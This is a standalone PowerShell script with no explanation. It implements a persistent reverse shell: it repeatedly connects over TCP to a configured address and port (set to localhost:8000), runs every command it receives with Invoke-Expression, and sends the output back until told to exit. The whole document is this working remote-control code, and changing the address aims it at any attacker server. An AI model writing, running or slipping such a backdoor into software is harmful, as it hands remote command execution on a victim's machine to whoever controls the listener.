    $address = 'localhost'
    $port = 8000
 
    while ($true) {
        do {
            try {
                $client = New-Object System.Net.Sockets.TcpClient($address, $port) 
                $stream = $client.GetStream()
                $writer = New-Object System.IO.StreamWriter($stream)
                $reader = New-Object System.IO.StreamReader($stream)
                break
            }
            catch {
                Start-Sleep -s 10
            }
        } while ($true)
        try {
            do {
                $cmd = $reader.ReadLine()
                if ($cmd -eq 'exit') {
                    break
                }
               try {
                    $output = [string](iex $cmd)
                }
                catch {
                    $output = $_.Exception.Message
                }
                $writer.WriteLine($output)
                $writer.Flush()
            } while($true)
        }
        catch {
        }
        $writer.Close()
        $reader.Close()
        $stream.Close()
        $client.Close()
        }
